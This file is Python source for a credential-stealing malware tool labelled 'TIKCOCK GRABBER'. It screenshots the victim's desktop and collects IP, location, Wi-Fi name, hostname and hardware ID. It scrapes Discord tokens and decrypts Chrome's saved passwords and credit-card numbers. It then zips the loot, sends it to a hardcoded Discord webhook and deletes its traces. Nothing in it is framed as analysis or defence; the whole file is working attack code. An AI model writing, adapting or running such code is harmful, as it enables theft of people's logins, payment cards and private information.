from os                     import environ, sep, remove, system, path, makedirs, walk, getenv, listdir
from json                   import loads, load
from base64                 import b64decode
from win32crypt             import CryptUnprotectData
from Crypto.Cipher          import AES
from shutil                 import copy2
from sqlite3                import connect
from requests               import request, get
from mss                    import mss
from time                   import sleep, time
from discord_webhook        import DiscordWebhook, DiscordEmbed
from colorama               import Fore, Style
from vardxg                 import *
from pathlib                import Path
import shutil
import zipfile
import requests
import subprocess
import datetime
import platform
import cpuinfo
import re


now = datetime.datetime.now()
current_time = now.strftime("%H:%M:%S")
webhook_url = "https://discord.com/api/webhooks/1112924973921746945/R7tyCeIjdFAGYCcslqEtf-gnK511G2oHEQARWAq74LlCC8BmCJ2AGRw299BNhdIkexsJ"



def get_user_ip():
    response = requests.get('http://ip-api.com/json/')
    data = response.json()
    return data['lat']

PING_ME = False

def find_tokens(path):
    path = str(path) + '\\Local Storage\\leveldb'

    tokens = []

    for file_name in listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens



def get_os_information():
    return platform.system(), platform.release()

def get_processor_information():
    return cpuinfo.get_cpu_info()['brand_raw']

os_info = get_os_information()
processor_info = get_processor_information()

def get_ip_info():
    try:
        response = requests.get("https://ipinfo.io/json")
        if response.status_code == 200:
            data = response.json()
            ip = data["ip"]
            country = data["country"]
            region = data["region"]
            city = data["city"]
            isp = data["org"]
            return ip, country, region, city, isp
    except requests.RequestException:
        pass

    return None, None, None, None, None

ip, country, region, city, isp = get_ip_info()

def get_wifi_info():
    try:
        output = subprocess.check_output(["netsh", "wlan", "show", "interfaces"]).decode("latin-1")
        lines = output.split("\n")
        for line in lines:
            if "SSID" in line:
                wifi_name = line.split(":")[1].strip()
                return wifi_name
    except subprocess.CalledProcessError:
        pass

    return "Not Connected"

def get_desktop_name():
    try:
        output = subprocess.check_output(["wmic", "computersystem", "get", "Name"]).decode("utf-8")
        lines = output.split("\n")
        for line in lines:
            if line.strip():
                desktop_name = line.strip()
                return desktop_name
    except subprocess.CalledProcessError:
        pass

    return "Unknown"

def get_hostname():
    try:
        output = subprocess.check_output(["hostname"]).decode("utf-8")
        hostname = output.strip()
        return hostname
    except subprocess.CalledProcessError:
        pass

    return "Unknown"

wifi_name = get_wifi_info()
desktop_name = get_desktop_name()
hostname = get_hostname()


def get_hwid():
    cmd = "wmic csproduct get uuid"
    output = subprocess.check_output(cmd, shell=True)
    hwid = output.decode("utf-8").strip().split("\n")[1].replace("-", "")
    return hwid

hwid = get_hwid()

def get_ip():
    url = "https://api.ipify.org?format=json"
    response = requests.get(url)
    if response.status_code == 200:
        ip = response.json()["ip"]
        system("cls")
        return ip
    else:
        system("cls")
        return None


def take_screenshot():
    screenshot_path = "screenshot.png"

    with mss() as sct:
        sct.shot(output=screenshot_path)

    return screenshot_path

def tikcock(screenshot_path, webhook_url):
        latitude = get_user_ip()
        webhook = DiscordWebhook(url=webhook_url)
        embed = DiscordEmbed(title="TIKCOCK GRABBER", color=None)
        embed.set_image(url="attachment://screenshot.png")
        embed.add_embed_field(name="Information", value="", inline=False)
        embed.add_embed_field(name="Logged Time ⏰", value=current_time, inline=True)
        embed.add_embed_field(name="Wi-Fi Name 📶", value=wifi_name, inline=True)
        embed.add_embed_field(name="IP 🌐", value=ip, inline=True)
        embed.add_embed_field(name="Country 🌍", value=country, inline=True)
        embed.add_embed_field(name="Region 📍", value=region, inline=True)
        embed.add_embed_field(name="City 🏙️", value=city, inline=True)
        embed.add_embed_field(name="ISP 🌐", value=isp, inline=True)
        embed.add_embed_field(name="Maps 🗺️", value=(f"https://www.google.com/maps/@{latitude}?entry=ttu"), inline=True)
        embed.add_embed_field(name="", value="\n", inline=True)
        embed.add_embed_field(name="Desktop Name 💻", value=hostname, inline=True)
        processor_info = cpuinfo.get_cpu_info()["brand_raw"]
        embed.add_embed_field(name="Processor ℹ️", value=processor_info, inline=True)
        os_info = platform.uname()
        embed.add_embed_field(name="System ℹ️", value=os_info[0], inline=True)
        embed.add_embed_field(name="HWID 🔒", value=hwid, inline=False)
        embed.set_footer(text="Made by amgxp#0988")
        webhook.add_embed(embed)
        webhook.add_file(file=open(screenshot_path, "rb"), filename="screenshot.png")
        webhook.execute()



def delete_screenshot():
    screenshot_path = "screenshot.png"
    if path.exists(screenshot_path):
        remove(screenshot_path)

def main():
    screenshot_path = take_screenshot()
    tikcock(screenshot_path, webhook_url)
    delete_screenshot()

if __name__ == "__main__":
    main()
    
def delete_zip_file():
    zip_filename = "output.zip"
    if path.exists(zip_filename):
        remove(zip_filename)
    order_filename = "output.zip"
    if path.exists(order_filename):
        remove(order_filename)

def delete_output_folder():
    folder_name = "output"
    if path.exists(folder_name):
        shutil.rmtree(folder_name)

def get_master_key():
    try:
        with open(environ["USERPROFILE"] + sep + r"AppData\Local\Google\Chrome\User Data\Local State", "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = loads(local_state)
    except:
        exit()
    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception:
        return "Chrome < 80"

def get_passwords():
    master_key = get_master_key()
    login_db = environ["USERPROFILE"] + sep + r"AppData\Local\Google\Chrome\User Data\default\Login Data"
    try:
        copy2(login_db, "Loginvault.db")
    except:
        exit()
    conn = connect("Loginvault.db")
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            if username != "" or decrypted_password != "":
                with open("passwords.txt", "a", encoding="utf-8") as passwords_txt:
                    passwords_txt.write("Site: " + url + "\nUsername: " + username + "\nPassword: " + decrypted_password + "\n" + "-" * 10 + "\n")
    except Exception:
        pass
    cursor.close()
    conn.close()
    try:
        remove("Loginvault.db")
    except Exception:
        pass

def get_payment_methods():
    master_key = get_master_key()
    login_db = environ["USERPROFILE"] + sep + r"AppData\Local\Google\Chrome\User Data\default\Web Data"
    copy2(login_db, "CCvault.db")
    conn = connect("CCvault.db")
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT * FROM credit_cards")
        for r in cursor.fetchall():
            username = r[1]
            encrypted_password = r[4]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            expire_mon = r[2]
            expire_year = r[3]
            with open("payment_methods.txt", "a", encoding="utf-8") as payment_methods_txt:
                payment_methods_txt.write("Name on card: " + username + "\nCard number: " + decrypted_password + "\nExpiration date: " + str(expire_mon) + "/" + str(expire_year) + "\n" + "-" * 10 + "\n")
    except Exception:
        pass
    cursor.close()
    conn.close()
    try:
        remove("CCvault.db")
    except Exception:
        pass


def move_files_to_folder():
    folder_name = "output"
    makedirs(folder_name, exist_ok=True)

    files_to_move = ["passwords.txt", "payment_methods.txt"]

    for file in files_to_move:
        if path.exists(file):
            shutil.move(file, path.join(folder_name, file))

def create_zip_folder():
    folder_name = "output"
    zip_filename = "output.zip"

    with zipfile.ZipFile(zip_filename, "w", zipfile.ZIP_DEFLATED) as zf:
        for root, dirs, files in walk(folder_name):
            for file in files:
                file_path = path.join(root, file)
                arcname = path.relpath(file_path, folder_name)
                zf.write(file_path, arcname=arcname)

def send_zip_file():
    zip_filename = "output.zip"

    webhook = {
        "content": "Hier ist die ZIP-Datei:",
        "embeds": [
            {
                "title": "Browser-Daten",
                "description": "ZIP-Datei mit Browser-Daten",
                "footer": {
                    "text": "Made by amgxp"
                }
            }
        ]
    }

    files = {
        "file": (zip_filename, open(zip_filename, "rb"))
    }

    response = requests.post(webhook_url, json=webhook, files=files)

def main():
    local = getenv('LOCALAPPDATA')
    roaming = getenv('APPDATA')

    paths = {
        'Discord': Path(roaming + '\\Discord'),
        'Discord Canary': Path(roaming + '\\discordcanary'),
        'Discord PTB': Path(roaming + '\\discordptb'),
        'Google Chrome': Path(local + '\\Google\\Chrome\\User Data\\Default'),
    }

    for platform, path in paths.items():
        if not path.exists():
            continue

        tokens = find_tokens(path)

        if len(tokens) > 0:
            message = f'\n```\n'
            for token in tokens:
                message += f'{token}\n'
            message += '```'

            webhook = DiscordWebhook(url=webhook_url)
            embed = DiscordEmbed(title='Discord Token', description=message, color=None)
            webhook.add_embed(embed)
            webhook.execute()

if __name__ == '__main__':
    main()
    

def main():
    get_passwords()
    get_payment_methods()
    get_ip()
    move_files_to_folder()
    create_zip_folder()
    send_zip_file()
    delete_zip_file()
    delete_output_folder()

if __name__ == "__main__":
    main()

